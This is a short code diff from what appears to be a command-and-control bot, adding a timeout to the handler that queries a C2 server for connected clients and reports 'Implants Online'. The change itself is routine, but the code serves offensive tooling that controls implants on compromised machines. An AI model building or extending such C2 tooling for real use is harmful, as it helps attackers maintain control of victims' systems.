@@ -198,7 +198,9 @@ def cmd_addcli(ack, respond, command):
 def cmd_clients(ack, respond, command):
     ack()
     try:
-        response = requests.get(f"https://{config.lhost}:{config.c2_port}/get_connected_clients", verify=C2_TLS_VERIFY)
+        response = requests.get(
+            f"https://{config.lhost}:{config.c2_port}/get_connected_clients", verify=C2_TLS_VERIFY, timeout=10
+        )
         if response.status_code == 200:
             clients = "\n".join(response.json().get("connected_clients", []))
             respond(f"🟢 Implants Online:\n{clients}")
